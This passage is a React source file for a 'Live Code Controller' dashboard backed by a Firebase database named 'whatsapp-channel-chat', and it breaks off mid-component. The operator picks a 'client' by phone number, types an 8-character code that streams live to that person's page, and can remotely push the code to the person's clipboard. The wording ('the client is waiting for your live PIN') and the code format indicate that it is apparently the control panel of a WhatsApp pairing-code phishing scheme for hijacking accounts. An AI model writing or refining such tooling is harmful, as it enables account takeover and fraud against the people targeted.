import React, { useState, useEffect, useRef } from "react";
import { initializeApp } from "firebase/app";
import { getDatabase, ref, set, onValue, remove } from "firebase/database";
import { 
  Gamepad2, Trash2, Radio, Check, Wifi, WifiOff, AlertCircle, 
  RefreshCw, Settings, Users, Search, Phone, Plus, Clock, 
  X, ChevronRight, MessageSquare, Database, Terminal, ShieldAlert
} from "lucide-react";
import { motion, AnimatePresence } from "motion/react";

// Web app's Firebase configuration (provided by user)
const firebaseConfig = {
  apiKey: "AIzaSyBqlFQzFAAQudAvmBH_KXuDzkLE4gHO7qo",
  authDomain: "whatsapp-channel-chat.firebaseapp.com",
  databaseURL: "https://whatsapp-channel-chat-default-rtdb.firebaseio.com",
  projectId: "whatsapp-channel-chat",
  storageBucket: "whatsapp-channel-chat.firebasestorage.app",
  messagingSenderId: "906974342849",
  appId: "1:906974342849:web:1a7c5e560f29ab57da2e40",
  measurementId: "G-V8Y7KX4F5Y"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

interface ClientSession {
  phoneNumber: string;
  code: string;
  timestamp: number;
  lastActive?: number;
}

export default function App() {
  // Client management states
  const [clients, setClients] = useState<Record<string, ClientSession>>({});
  const [selectedPhone, setSelectedPhone] = useState<string | null>(null);
  const [searchQuery, setSearchQuery] = useState<string>("");
  const [newPhoneInput, setNewPhoneInput] = useState<string>("");
  
  // Real-time synchronization states
  const [syncStatus, setSyncStatus] = useState<"syncing" | "synced" | "error">("synced");
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [isConnected, setIsConnected] = useState<boolean>(true);

  // Firebase Configuration & Path States
  const [firebasePath, setFirebasePath] = useState<string>(() => localStorage.getItem("firebase_path") || "clients");
  const [isConfigOpen, setIsConfigOpen] = useState<boolean>(false);
  const [systemLogs, setSystemLogs] = useState<string[]>([]);
  const [remoteCopyStatus, setRemoteCopyStatus] = useState<"idle" | "sending" | "sent">("idle");
  const [copyingPhones, setCopyingPhones] = useState<Record<string, "idle" | "sending" | "sent">>({});
  const [isIntegrationOpen, setIsIntegrationOpen] = useState<boolean>(false);
  const [deletingPhone, setDeletingPhone] = useState<string | null>(null);
  const [integrationCopied, setIntegrationCopied] = useState<boolean>(false);

  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // Selected client's PIN code digits state (always 8 characters)
  const [digits, setDigits] = useState<string[]>(Array(8).fill(""));

  // Log message generator for panel
  const addLog = (message: string) => {
    setSystemLogs((prev) => [
      `[${new Date().toLocaleTimeString()}] ${message}`,
      ...prev.slice(0, 49) // Keep last 50 logs
    ]);
  };

  // Normalize database path to clean formatting
  const cleanPath = firebasePath.trim().replace(/^\/+|\/+$/g, "") || "clients";

  // Fetch and track active clients from Firebase Realtime Database
  useEffect(() => {
    const clientsRef = ref(db, cleanPath);
    addLog(`System initialized. Listening to Firebase path: /${cleanPath}`);
    
    // Listen to internet/database connection state
    const connectedRef = ref(db, '.info/connected');
    const unsubscribeConnected = onValue(connectedRef, (snap) => {
      setIsConnected(snap.val() === true);
    });

    // Listen to configured path to dynamically update clients in real-time
    const unsubscribeClients = onValue(clientsRef, (snapshot) => {
      const data = snapshot.val();
      if (data) {
        setClients(data);
        
        // Auto-select first client if none selected
        const clientKeys = Object.keys(data);
        if (clientKeys.length > 0 && !selectedPhone) {
          // Find most recent client to select
          const sorted = clientKeys.sort((a, b) => (data[b].timestamp || 0) - (data[a].timestamp || 0));
          setSelectedPhone(sorted[0]);
        }
      } else {
        setClients({});
        setSelectedPhone(null);
      }
    }, (error) => {
      console.error("Firebase Clients Load Error:", error);
      setErrorMessage("Firebase error: " + error.message);
      addLog(`❌ Firebase Load Error: ${error.message}`);
    });

    return () => {
      unsubscribeConnected();
      unsubscribeClients();
    };
  }, [selectedPhone, cleanPath]);

  // Handle selected phone code state update when clients object or selected phone changes
  useEffect(() => {
    if (selectedPhone && clients[selectedPhone]) {
      const activeCode = clients[selectedPhone].code || "";
      const newDigits = Array(8).fill("");
      for (let i = 0; i < activeCode.length; i++) {
        newDigits[i] = activeCode[i];
      }
      setDigits(newDigits);
    } else {
      setDigits(Array(8).fill(""));
    }
  }, [selectedPhone, clients]);

  // Local storage persistence of Firebase settings
  useEffect(() => {
    localStorage.setItem("firebase_path", firebasePath);
  }, [firebasePath]);

  // Synchronize targeted client's PIN code
  const syncCodeForClient = (targetPhone: string, codeArray: string[]) => {
    const fullCode = codeArray.join("");
    setSyncStatus("syncing");
    setErrorMessage(null);

    set(ref(db, `${cleanPath}/${targetPhone}/code`), fullCode)
      .then(() => {
        setSyncStatus("synced");
        addLog(`Successfully synced code for ${targetPhone}: ${fullCode || "CLEARED"}`);
      })
      .catch((err) => {
        setSyncStatus("error");
        setErrorMessage(err instanceof Error ? err.message : String(err));
        addLog(`❌ Sync error for ${targetPhone}: ${err.message}`);
      });
  };

  // Remotely trigger a copy to clipboard on the client's phone/web page
  const triggerRemoteCopy = (targetPhone: string) => {
    if (!targetPhone) return;
    
    // Set status for this specific phone
    setCopyingPhones((prev) => ({ ...prev, [targetPhone]: "sending" }));
    if (targetPhone === selectedPhone) {
      setRemoteCopyStatus("sending");
    }

    // Get the most up-to-date code from database state, fallback to digits array if it's currently selected
    const fullCode = clients[targetPhone]?.code || (targetPhone === selectedPhone ? digits.join("") : "");

    set(ref(db, `${cleanPath}/${targetPhone}/copyTrigger`), {
      timestamp: Date.now(),
      code: fullCode
    })
      .then(() => {
        setCopyingPhones((prev) => ({ ...prev, [targetPhone]: "sent" }));
        if (targetPhone === selectedPhone) {
          setRemoteCopyStatus("sent");
        }
        addLog(`⚡ Sent REMOTE COPY signal to ${targetPhone} client for code: ${fullCode || "EMPTY"}`);
        setTimeout(() => {
          setCopyingPhones((prev) => ({ ...prev, [targetPhone]: "idle" }));
          if (targetPhone === selectedPhone) {
            setRemoteCopyStatus("idle");
          }
        }, 2000);
      })
      .catch((err: any) => {
        setCopyingPhones((prev) => ({ ...prev, [targetPhone]: "idle" }));
        if (targetPhone === selectedPhone) {
          setRemoteCopyStatus("idle");
        }
        setErrorMessage(err instanceof Error ? err.message : String(err));
        addLog(`❌ Remote copy trigger failed for ${targetPhone}: ${err.message}`);
      });
  };

  // Keyboard navigation & character input handling
  const handleChange = (e: React.ChangeEvent<HTMLInputElement>, index: number) => {
    if (!selectedPhone) return;

    const val = e.target.value;
    if (val) {
      const char = val.charAt(val.length - 1).toUpperCase();
      // Block any non-alphanumeric character (allowing only English letters A-Z and digits 0-9)
      if (!/^[A-Z0-9]$/.test(char)) {
        return;
      }
      const newDigits = [...digits];
      newDigits[index] = char;
      setDigits(newDigits);
      syncCodeForClient(selectedPhone, newDigits);

      // Auto Focus Next
      if (index < 7) {
        inputRefs.current[index + 1]?.focus();
      }
    } else {
      // Handle backspace/deletion when value becomes empty (critical for mobile/virtual keyboards)
      const newDigits = [...digits];
      newDigits[index] = "";
      setDigits(newDigits);
      syncCodeForClient(selectedPhone, newDigits);
      if (index > 0) {
        inputRefs.current[index - 1]?.focus();
      }
    }
  };

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>, index: number) => {
    if (!selectedPhone) return;

    if (e.key === "Backspace") {
      const newDigits = [...digits];
      if (digits[index]) {
        newDigits[index] = "";
        setDigits(newDigits);
        syncCodeForClient(selectedPhone, newDigits);
        if (index > 0) {
          inputRefs.current[index - 1]?.focus();
        }
        e.preventDefault();
      } else {
        if (index > 0) {
          newDigits[index - 1] = "";
          setDigits(newDigits);
          inputRefs.current[index - 1]?.focus();
          syncCodeForClient(selectedPhone, newDigits);
          e.preventDefault();
        }
      }
    } else if (e.key === "ArrowLeft") {
      if (index > 0) {
        inputRefs.current[index - 1]?.focus();
        e.preventDefault();
      }
    } else if (e.key === "ArrowRight") {
      if (index < 7) {
        inputRefs.current[index + 1]?.focus();
        e.preventDefault();
      }
    }
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    if (!selectedPhone) return;

    const pasteData = e.clipboardData.getData("text").trim();
    if (pasteData) {
      // Clean paste data: keep only English letters and digits (A-Z, a-z, 0-9)
      const cleanPaste = pasteData.replace(/[^a-zA-Z0-9]/g, "").toUpperCase();
      if (!cleanPaste) return;
      const pasteDigits = cleanPaste.slice(0, 8).split("");
      const newDigits = [...digits];
      for (let i = 0; i < 8; i++) {
        if (pasteDigits[i] !== undefined) {
          newDigits[i] = pasteDigits[i];
        }
      }
      setDigits(newDigits);
      syncCodeForClient(selectedPhone, newDigits);
      
      const focusIndex = Math.min(cleanPaste.length, 7);
      inputRefs.current[focusIndex]?.focus();
      e.preventDefault();
    }
  };

  // Individual client code clearance
  const clearClientCode = (phone: string) => {
    const cleared = Array(8).fill("");
    if (selectedPhone === phone) {
      setDigits(cleared);
    }
    syncCodeForClient(phone, cleared);
  };

  // Completely delete client session
  const deleteClient = (phone: string) => {
    setDeletingPhone(phone);
  };

  // Perform actual deletion when custom modal is confirmed
  const confirmDeleteClient = () => {
    if (!deletingPhone) return;
    const phone = deletingPhone;
    setDeletingPhone(null);

    remove(ref(db, `${cleanPath}/${phone}`))
      .then(() => {
        addLog(`Deleted client session: ${phone}`);
        if (selectedPhone === phone) {
          setSelectedPhone(null);
        }
      })
      .catch((err) => {
        console.error("Delete client error:", err);
        setErrorMessage("Error deleting client: " + err.message);
        addLog(`❌ Delete client error: ${err.message}`);
      });
  };

  // Manual client enrollment
  const handleAddClientManual = (e: React.FormEvent) => {
    e.preventDefault();
    const phone = newPhoneInput.trim();
    if (!phone) return;

    // Filter non-digit characters
    const cleanPhone = phone.replace(/\D/g, "");
    if (cleanPhone.length < 8) {
      alert("Please enter a valid phone number (at least 8 digits)");
      return;
    }

    set(ref(db, `${cleanPath}/${cleanPhone}`), {
      phoneNumber: cleanPhone,
      code: "",
      timestamp: Date.now(),
      lastActive: Date.now()
    }).then(() => {
      addLog(`Manually enrolled client: ${cleanPhone}`);
      setSelectedPhone(cleanPhone);
      setNewPhoneInput("");
    }).catch((err) => {
      alert("Error enrolling client: " + err.message);
      addLog(`❌ Enroll client error: ${err.message}`);
    });
  };

  // Dynamic search/filtering logic
  const filteredClientKeys = Object.keys(clients).filter((key) => {
    return key.toLowerCase().includes(searchQuery.toLowerCase());
  }).sort((a, b) => {
    // Sort by recent active timestamp first
    return (clients[b].timestamp || 0) - (clients[a].timestamp || 0);
  });

  const fullCodeString = digits.join("");

  return (
    <div className="relative min-h-screen bg-[#0f172a] text-slate-100 flex flex-col font-sans overflow-x-hidden">
      {/* Background aesthetics */}
      <div className="absolute inset-0 bg-[radial-gradient(circle_at_top_right,rgba(14,165,233,0.08),transparent_50%)] pointer-events-none z-0" />
      <div className="absolute inset-0 bg-[radial-gradient(circle_at_bottom_left,rgba(225,29,72,0.04),transparent_50%)] pointer-events-none z-0" />
      <div className="absolute inset-0 bg-[linear-gradient(to_right,#33415504_1px,transparent_1px),linear-gradient(to_bottom,#33415504_1px,transparent_1px)] bg-[size:4rem_4rem] pointer-events-none z-0" />

      {/* Main App Bar */}
      <header className="relative z-10 border-b border-slate-800 bg-slate-900/60 backdrop-blur-md px-6 py-4">
        <div className="max-w-7xl mx-auto flex flex-col md:flex-row items-center justify-between gap-4">
          
          <div className="flex items-center gap-3">
            <div className="p-2.5 bg-sky-500/10 rounded-xl text-sky-400 border border-sky-500/20 shadow-lg shadow-sky-500/5">
              <Gamepad2 className="w-6 h-6 animate-pulse" />
            </div>
            <div>
              <h1 className="text-xl font-bold text-slate-100 tracking-tight flex items-center gap-2">
                Live Code Controller <span className="text-xs bg-sky-500/20 text-sky-400 font-medium px-2 py-0.5 rounded-full border border-sky-500/10">v2.0 PRO</span>
              </h1>
              <p className="text-xs text-slate-400 mt-0.5">Dual-mode multi-client live execution panel</p>
            </div>
          </div>

          <div className="flex flex-wrap items-center gap-3">
            {/* Connection state */}
            <div className="flex items-center gap-2 text-xs font-mono bg-slate-950/60 px-3.5 py-2 rounded-xl border border-slate-800">
              <span className={`w-2.5 h-2.5 rounded-full shadow-sm ${isConnected ? 'bg-emerald-500 animate-pulse shadow-emerald-500/50' : 'bg-rose-500 shadow-rose-500/50'}`} />
              <span className={isConnected ? "text-emerald-400" : "text-rose-400"}>
                {isConnected ? "DATABASE ONLINE" : "OFFLINE"}
              </span>
            </div>

            {/* Firebase Path Status */}
            <div className="flex items-center gap-2 text-xs font-mono bg-slate-950/60 px-3.5 py-2 rounded-xl border border-slate-800">
              <Database className="w-3.5 h-3.5 text-sky-400" />
              <span className="text-slate-400">PATH:</span>
              <span className="text-sky-400 font-bold">/{cleanPath}</span>
            </div>

            {/* Config Button */}
            <button 
              onClick={() => setIsConfigOpen(!isConfigOpen)}
              className={`p-2 rounded-xl border transition flex items-center gap-1.5 text-xs font-semibold cursor-pointer ${isConfigOpen ? 'bg-sky-500/20 text-sky-400 border-sky-500/40 shadow-lg' : 'bg-slate-800 text-slate-300 border-slate-700 hover:bg-slate-750'}`}
            >
              <Settings className="w-4 h-4" />
              Settings
            </button>
          </div>
        </div>
      </header>

      {/* Collapsible Firebase & Client Settings bar */}
      <AnimatePresence>
        {isConfigOpen && (
          <motion.div
            initial={{ height: 0, opacity: 0 }}
            animate={{ height: "auto", opacity: 1 }}
            exit={{ height: 0, opacity: 0 }}
            className="relative z-10 bg-slate-900/90 border-b border-slate-800 overflow-hidden"
          >
            <div className="max-w-7xl mx-auto p-6 grid grid-cols-1 lg:grid-cols-12 gap-6">
              
              {/* Manual Enroller */}
              <div className="lg:col-span-4 bg-slate-950/40 p-4 rounded-xl border border-slate-800">
                <h3 className="text-xs font-semibold uppercase tracking-wider text-slate-400 mb-3 flex items-center gap-2">
                  <Plus className="w-4 h-4 text-emerald-400" /> Manually Add Client
                </h3>
                <form onSubmit={handleAddClientManual} className="flex gap-2">
                  <div className="relative flex-1">
                    <Phone className="absolute left-3 top-2.5 w-4 h-4 text-slate-500" />
                    <input 
                      type="text" 
                      placeholder="Enter Client Phone" 
                      value={newPhoneInput}
                      onChange={(e) => setNewPhoneInput(e.target.value)}
                      className="w-full pl-9 pr-3 py-2 bg-slate-900 border border-slate-750 rounded-lg text-sm text-slate-200 outline-none focus:border-emerald-500/50 font-mono transition"
                    />
                  </div>
                  <button 
                    type="submit" 
                    className="px-4 py-2 bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 rounded-lg hover:bg-emerald-500 hover:text-white transition text-xs font-bold font-mono cursor-pointer"
                  >
                    Enroll
                  </button>
                </form>
                <p className="text-[10px] text-slate-500 mt-2">
                  Directly add a client session into the currently active Realtime Database reference node.
                </p>
              </div>

              {/* Firebase Database Configurator */}
              <div className="lg:col-span-5 bg-slate-950/40 p-4 rounded-xl border border-slate-800">
                <div className="flex items-center justify-between mb-3">
                  <h3 className="text-xs font-semibold uppercase tracking-wider text-slate-400 flex items-center gap-2">
                    <Database className="w-4 h-4 text-sky-400" /> Firebase Database Reference Path
                  </h3>
                </div>

                <div className="space-y-3">
                  <div>
                    <label className="block text-[10px] font-mono text-slate-400 mb-1">DATABASE BASE NODE PATH</label>
                    <div className="flex gap-2">
                      <input 
                        type="text" 
                        placeholder="clients" 
                        value={firebasePath}
                        onChange={(e) => setFirebasePath(e.target.value)}
                        className="flex-1 px-3 py-1.5 bg-slate-900 border border-slate-750 rounded-lg text-xs font-mono text-slate-200 outline-none focus:border-sky-500/50"
                      />
                      <button 
                        onClick={() => {
                          setFirebasePath("clients");
                          addLog("Reset database reference path to default 'clients'.");
                        }} 
                        className="text-[10px] font-semibold font-mono text-amber-400/80 hover:text-amber-400 bg-amber-500/5 px-2.5 rounded border border-amber-500/15 cursor-pointer"
                      >
                        Reset Default
                      </button>
                    </div>
                    <p className="text-[9px] text-slate-500 mt-1.5 leading-relaxed">
                      All clients and live pin codes are listened and synchronized from: <code className="text-sky-400 font-mono">/{cleanPath}</code>
                    </p>
                  </div>
                </div>
              </div>

              {/* System & Database Event Logs */}
              <div className="lg:col-span-3 bg-slate-950/40 p-4 rounded-xl border border-slate-800 flex flex-col h-[150px]">
                <h3 className="text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2 flex items-center gap-2">
                  <Terminal className="w-4 h-4 text-amber-400 animate-pulse" /> System Activity Console
                </h3>
                <div className="flex-1 overflow-y-auto bg-slate-900 p-2.5 rounded-lg border border-slate-800 text-[10px] font-mono text-slate-300 space-y-1">
                  {systemLogs.length === 0 ? (
                    <p className="text-slate-500 italic text-center pt-8">No current database activity logs...</p>
                  ) : (
                    systemLogs.map((log, i) => (
                      <p key={i} className="leading-relaxed border-b border-slate-900 pb-0.5 whitespace-nowrap overflow-hidden text-ellipsis">{log}</p>
                    ))
                  )}
                </div>
              </div>

            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Main Panel Content - Split Screen */}
      <main className="relative z-10 flex-1 max-w-7xl w-full mx-auto p-4 md:p-6 grid grid-cols-1 lg:grid-cols-12 gap-6 min-h-0">
        
        {/* Left Side: Active Clients Registry */}
        <section className="lg:col-span-5 bg-slate-900/60 border border-slate-800 rounded-2xl p-4 backdrop-blur-md flex flex-col h-[calc(100vh-200px)] lg:h-[calc(100vh-140px)] min-h-[450px]">
          
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center gap-2">
              <Users className="w-5 h-5 text-sky-400" />
              <h2 className="font-bold text-slate-200">Active Sessions</h2>
              <span className="text-xs bg-slate-800 text-sky-400 font-semibold px-2 py-0.5 rounded-md border border-slate-700">
                {Object.keys(clients).length}
              </span>
            </div>
            
            {/* Real-time sync badge */}
            <div className="text-[10px] font-mono font-bold text-emerald-400 bg-emerald-500/10 px-2.5 py-1 rounded-md border border-emerald-500/20">
              REAL-TIME LISTENER
            </div>
          </div>

          {/* Search bar */}
          <div className="relative mb-4">
            <Search className="absolute left-3 top-2.5 w-4 h-4 text-slate-400" />
            <input 
              type="text" 
              placeholder="Search phone number..." 
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className="w-full pl-9 pr-8 py-2 bg-slate-950/80 border border-slate-800 rounded-xl text-sm text-slate-200 placeholder-slate-400 outline-none focus:border-sky-500/40 transition"
            />
            {searchQuery && (
              <button 
                onClick={() => setSearchQuery("")}
                className="absolute right-3 top-2.5 text-slate-400 hover:text-white"
              >
                <X className="w-4 h-4" />
              </button>
            )}
          </div>

          {/* Clients List container */}
          <div className="flex-1 overflow-y-auto space-y-2 pr-1 custom-scrollbar">
            {filteredClientKeys.length === 0 ? (
              <div className="h-full flex flex-col items-center justify-center p-8 text-center text-slate-500">
                <Database className="w-12 h-12 text-slate-600 mb-3" />
                <p className="text-sm font-semibold">No Active Sessions Found</p>
                <p className="text-xs text-slate-500 max-w-[280px] mt-1">
                  Wait for customers to submit phone numbers into your Realtime Database node, or add manually in Settings.
                </p>
              </div>
            ) : (
              filteredClientKeys.map((phone) => {
                const client = clients[phone];
                const isSelected = selectedPhone === phone;
                const formattedTime = client.timestamp ? new Date(client.timestamp).toLocaleTimeString() : "";

                return (
                  <motion.div
                    key={phone}
                    layoutId={`client-${phone}`}
                    onClick={() => setSelectedPhone(phone)}
                    className={`p-3.5 rounded-xl border transition-all duration-200 cursor-pointer relative flex items-center justify-between group ${isSelected ? 'bg-sky-500/10 border-sky-500/50 shadow-md shadow-sky-500/5' : 'bg-slate-950/40 border-slate-800/80 hover:bg-slate-850 hover:border-slate-700'}`}
                  >
                    <div className="flex items-center gap-3">
                      <div className={`p-2 rounded-lg transition-colors duration-200 ${isSelected ? 'bg-sky-500/20 text-sky-400' : 'bg-slate-800 text-slate-400 group-hover:text-slate-300'}`}>
                        <Phone className="w-4 h-4" />
                      </div>
                      
                      <div className="space-y-1">
                        <p className="text-sm font-bold text-slate-200 font-mono tracking-wide">
                          {phone}
                        </p>
                        <div className="flex items-center gap-2 text-[10px] text-slate-400">
                          <span className="flex items-center gap-1">
                            <Clock className="w-3 h-3 text-slate-500" />
                            {formattedTime || "Registered"}
                          </span>
                          <span>•</span>
                          <span className="font-semibold text-slate-300">
                            Code: <span className="text-sky-400 font-mono tracking-widest">{client.code || "None"}</span>
                          </span>
                        </div>
                      </div>
                    </div>

                    <div className="flex items-center gap-1.5 opacity-90 lg:opacity-30 group-hover:opacity-100 transition-opacity">
                      {/* Remotely Copy to Client Button */}
                      <button
                        onClick={(e) => {
                          e.stopPropagation();
                          triggerRemoteCopy(phone);
                        }}
                        title="Remotely Copy to Client (গ্রাহকের ফোনে কোড কপি করুন)"
                        className={`p-1.5 rounded-lg border transition cursor-pointer ${
                          copyingPhones[phone] === "sending"
                            ? "bg-amber-500/20 text-amber-400 border-amber-500/30"
                            : copyingPhones[phone] === "sent"
                            ? "bg-emerald-500/20 text-emerald-400 border-emerald-500/30"
                            : "bg-slate-800 hover:bg-sky-500/20 text-slate-400 hover:text-sky-400 border-slate-700/50 hover:border-sky-500/30"
                        }`}
                      >
                        {copyingPhones[phone] === "sending" && <RefreshCw className="w-3.5 h-3.5 animate-spin" />}
                        {copyingPhones[phone] === "sent" && <Check className="w-3.5 h-3.5 text-emerald-400 animate-bounce" />}
                        {(!copyingPhones[phone] || copyingPhones[phone] === "idle") && <Radio className="w-3.5 h-3.5 animate-pulse" />}
                      </button>

                      {/* Clear client code button */}
                      <button
                        onClick={(e) => {
                          e.stopPropagation();
                          clearClientCode(phone);
                        }}
                        title="Clear current client code"
                        className="p-1.5 rounded-lg bg-slate-800 hover:bg-rose-500/20 text-slate-400 hover:text-rose-400 border border-slate-700/50 hover:border-rose-500/30 transition cursor-pointer"
                      >
                        <Trash2 className="w-3.5 h-3.5" />
                      </button>
                      
                      {/* Delete client session button */}
                      <button
                        onClick={(e) => {
                          e.stopPropagation();
                          deleteClient(phone);
                        }}
                        title="Delete client session"
                        className="p-1.5 rounded-lg bg-slate-800 hover:bg-red-500/20 text-slate-400 hover:text-red-400 border border-slate-700/50 hover:border-red-500/30 transition cursor-pointer"
                      >
                        <X className="w-3.5 h-3.5" />
                      </button>

                      <ChevronRight className={`w-4 h-4 ${isSelected ? 'text-sky-400' : 'text-slate-500'}`} />
                    </div>
                  </motion.div>
                );
              })
            )}
          </div>
        </section>

        {/* Right Side: Detailed Controller for Selected Client */}
        <section className="lg:col-span-7 flex flex-col justify-start items-stretch h-[calc(100vh-200px)] lg:h-[calc(100vh-140px)] min-h-[450px]">
          <AnimatePresence mode="wait">
            {selectedPhone && clients[selectedPhone] ? (
              <motion.div
                key={selectedPhone}
                initial={{ opacity: 0, scale: 0.98, y: 5 }}
                animate={{ opacity: 1, scale: 1, y: 0 }}
                exit={{ opacity: 0, scale: 0.98, y: -5 }}
                transition={{ duration: 0.2 }}
                className="bg-slate-900/60 border border-slate-800 p-4 sm:p-5 rounded-2xl shadow-[0_20px_50px_rgba(0,0,0,0.4)] w-full text-center backdrop-blur-md relative overflow-hidden flex flex-col justify-between h-full"
              >
                {/* Floating active overlay status */}
                <div className="absolute top-0 inset-x-0 h-[2px] bg-gradient-to-r from-sky-500/20 via-sky-500 to-sky-500/20" />

                <div>
                  {/* Card Header */}
                  <div className="flex flex-col sm:flex-row items-center justify-between gap-3 mb-4 pb-4 border-b border-slate-800">
                    <div className="flex items-center gap-2.5">
                      <div className="p-2 bg-sky-500/10 rounded-lg text-sky-400 border border-sky-500/20 shadow-md">
                        <Phone className="w-5 h-5" />
                      </div>
                      <div className="text-left">
                        <span className="text-[9px] font-mono text-sky-400 font-bold uppercase tracking-widest block">Active Client Session</span>
                        <h2 className="text-lg font-bold text-slate-100 font-mono tracking-wide">{selectedPhone}</h2>
                      </div>
                    </div>

                    <div className="flex items-center gap-1.5">
                      <div className="text-[9px] font-mono text-slate-400 bg-slate-950/60 px-2.5 py-1.5 rounded-lg border border-slate-800 flex items-center gap-1">
                        <Clock className="w-3 h-3 text-slate-500" />
                        <span>Entered: {new Date(clients[selectedPhone].timestamp || Date.now()).toLocaleTimeString()}</span>
                      </div>
                    </div>
                  </div>

                  <p className="text-slate-400 text-xs mb-5 max-w-md mx-auto leading-relaxed">
                    The client is waiting for your live PIN. Type the code below to stream it to their page instantly.
                  </p>

                  {/* 8 Digit Input Boxes */}
                  <div className="flex justify-center gap-1 sm:gap-1.5 mb-5" id="inputContainer">
                    {digits.map((digit, idx) => (
                      <motion.input
                        key={`${selectedPhone}-digit-${idx}`}
                        ref={(el) => {
                          inputRefs.current[idx] = el;
                        }}
                        type="text"
                        maxLength={1}
                        value={digit}
                        onChange={(e) => handleChange(e, idx)}
                        onKeyDown={(e) => handleKeyDown(e, idx)}
                        onPaste={handlePaste}
                        onFocus={(e) => e.target.select()}
                        whileFocus={{ scale: 1.05 }}
                        className="w-[28px] h-[38px] sm:w-[35px] sm:h-[45px] md:w-[38px] md:h-[48px] text-base sm:text-lg font-bold text-center uppercase font-mono rounded-lg border-2 border-slate-700 bg-[#070b13] text-sky-400 transition-all duration-200 outline-none focus:border-sky-400 focus:shadow-[0_0_10px_rgba(56,189,248,0.3)]"
                      />
                    ))}
                  </div>

                  {/* Active Code Indicator */}
                  <div className="mb-4 p-2.5 rounded-xl bg-slate-950/40 border border-slate-800/80 flex items-center justify-between">
                    <div className="flex items-center gap-1.5">
                      <div className="w-1.5 h-1.5 rounded-full bg-sky-500 animate-ping" />
                      <span className="text-[10px] font-mono text-slate-400 uppercase tracking-wider">TARGET PATH</span>
                    </div>
                    <span className="text-[10px] font-mono text-slate-300 truncate max-w-[160px] sm:max-w-[280px]">
                      /{cleanPath}/<span className="text-sky-400 font-bold">{selectedPhone}</span>/code
                    </span>
                  </div>
                </div>
                           {/* Active Controls */}
                <div className="flex flex-col sm:flex-row gap-2 mt-2">
                  <motion.button
                    whileHover={{ scale: 1.01 }}
                    whileTap={{ scale: 0.99 }}
                    onClick={() => clearClientCode(selectedPhone)}
                    className="flex-1 py-2 rounded-lg bg-rose-500/10 text-rose-400 border border-rose-500/20 hover:bg-rose-500 hover:text-white transition font-bold text-xs flex items-center justify-center gap-1.5 cursor-pointer"
                  >
                    <Trash2 className="w-3.5 h-3.5" />
                    Clear Code
                  </motion.button>
                  
                  <div className="flex-1">
                    <AnimatePresence mode="wait">
                      {syncStatus === "syncing" && (
                        <motion.div
                          key="syncing"
                          initial={{ opacity: 0, scale: 0.98 }}
                          animate={{ opacity: 1, scale: 1 }}
                          exit={{ opacity: 0, scale: 0.98 }}
                          className="w-full py-2 h-full rounded-lg bg-amber-500/10 text-amber-400 border border-amber-500/20 font-bold text-xs flex items-center justify-center gap-1.5"
                        >
                          <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                          Syncing live...
                        </motion.div>
                      )}

                      {syncStatus === "synced" && (
                        <motion.div
                          key="synced"
                          initial={{ opacity: 0, scale: 0.98 }}
                          animate={{ opacity: 1, scale: 1 }}
                          exit={{ opacity: 0, scale: 0.98 }}
                          className="w-full py-2 h-full rounded-lg bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 font-bold text-xs flex items-center justify-center gap-1.5"
                        >
                          <Radio className="w-3.5 h-3.5 animate-pulse text-emerald-400" />
                          Live: <span className="font-mono text-emerald-300 tracking-wider font-bold ml-1">{fullCodeString || "EMPTY"}</span>
                        </motion.div>
                      )}

                      {syncStatus === "error" && (
                        <motion.div
                          key="error"
                          initial={{ opacity: 0, scale: 0.98 }}
                          animate={{ opacity: 1, scale: 1 }}
                          exit={{ opacity: 0, scale: 0.98 }}
                          className="w-full py-2 h-full rounded-lg bg-rose-500/10 text-rose-400 border border-rose-500/20 font-bold text-xs flex items-center justify-center gap-1.5"
                        >
                          <AlertCircle className="w-3.5 h-3.5" />
                          Sync error
                        </motion.div>
                      )}
                    </AnimatePresence>
                  </div>
                </div>

                {/* Remote Copy Command Trigger Button */}
                <motion.button
                  whileHover={{ scale: 1.01 }}
                  whileTap={{ scale: 0.99 }}
                  onClick={() => triggerRemoteCopy(selectedPhone)}
                  className={`w-full py-2.5 rounded-lg font-bold text-xs flex items-center justify-center gap-1.5 cursor-pointer shadow-md transition-all duration-200 mt-2 ${
                    remoteCopyStatus === "sending"
                      ? "bg-amber-500/20 text-amber-400 border border-amber-500/30"
                      : remoteCopyStatus === "sent"
                      ? "bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 shadow-emerald-500/5"
                      : "bg-sky-500 text-white hover:bg-sky-400 border border-sky-400 shadow-sky-500/10"
                  }`}
                >
                  {remoteCopyStatus === "sending" && <RefreshCw className="w-3.5 h-3.5 animate-spin" />}
                  {remoteCopyStatus === "sent" && <Check className="w-3.5 h-3.5 text-emerald-400 animate-bounce" />}
                  {remoteCopyStatus === "idle" && <Radio className="w-3.5 h-3.5 text-white animate-pulse" />}
                  
                  {remoteCopyStatus === "sending" && "Sending Copy Signal..."}
                  {remoteCopyStatus === "sent" && "Remote Copy Triggered Successfully!"}
                  {remoteCopyStatus === "idle" && "Remotely Copy to Client (গ্রাহকের ফোনে কোড কপি করুন)"}
                </motion.button>

                {/* Open Client Integration Code Button */}
                <button
                  onClick={() => setIsIntegrationOpen(true)}
                  className="w-full py-2 rounded-lg bg-slate-950/40 border border-slate-800 hover:border-slate-700 text-slate-400 hover:text-slate-300 transition-all font-semibold text-[11px] mt-2 flex items-center justify-center gap-1 cursor-pointer"
                >
                  <Terminal className="w-3.5 h-3.5 text-slate-500" />
                  Get Client Integration HTML Code (ক্লায়েন্ট সাইড কোডটি নিন)
                </button>

                {errorMessage && (
                  <motion.p
                    initial={{ opacity: 0, y: 3 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="text-rose-400 text-[10px] mt-2 font-mono leading-relaxed"
                  >
                    Error: {errorMessage}
                  </motion.p>
                )}
              </motion.div>
            ) : (
              <motion.div
                key="placeholder"
                initial={{ opacity: 0, scale: 0.98 }}
                animate={{ opacity: 1, scale: 1 }}
